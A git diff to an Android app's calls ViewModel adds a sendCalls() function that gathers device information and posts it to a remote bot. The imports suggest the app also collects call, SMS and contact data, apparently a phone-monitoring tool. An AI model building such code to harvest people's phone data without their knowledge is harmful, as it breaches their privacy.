@@ -1,4 +1,4 @@
-package com.github.yohannestz.popov.ui.viewmodels
+package com.github.yohannestz.popov.viewmodels
 
 import android.app.Application
 import android.os.Environment
@@ -18,6 +18,9 @@ import com.github.yohannestz.popov.data.local.db.impl.MessageLogRepositoryImpl
 import com.github.yohannestz.popov.data.model.Bot
 import com.github.yohannestz.popov.data.model.Call
 import com.github.yohannestz.popov.data.model.ContactsFileLog
+import com.github.yohannestz.popov.data.model.SendCallsRequestBody
+import com.github.yohannestz.popov.data.model.SendDeviceInfoRequestBody
+import com.github.yohannestz.popov.data.model.SendSmsRequestBody
 import com.github.yohannestz.popov.data.remote.NetworkService
 import com.github.yohannestz.popov.ui.calls.CallScreenState
 import com.google.gson.Gson
@@ -84,6 +87,30 @@ class CallsViewModel @Inject constructor(
         val gson = Gson()
         val str = gson.toJson(deviceInfoRepository.getDeviceInformation())
         Log.e("deviceInfo",str)
+    }
+
+    fun sendCalls() {
+        viewModelScope.launch {
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = true
+                )
+            }
+
+            withContext(Dispatchers.IO) {
+                val deviceInfo = deviceInfoRepository.getDeviceInformation()
+                val deviceInfoReqBody = SendDeviceInfoRequestBody(deviceInfo)
+                Log.e("body: ", deviceInfoReqBody.toString())
+                val response = networkService.sendDeviceInfo(bot.botId, deviceInfo)
+                Log.e("success: ", response.body().toString())
+            }
+
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = false
+                )
+            }
+        }
     }
 
     fun getAllApps() {
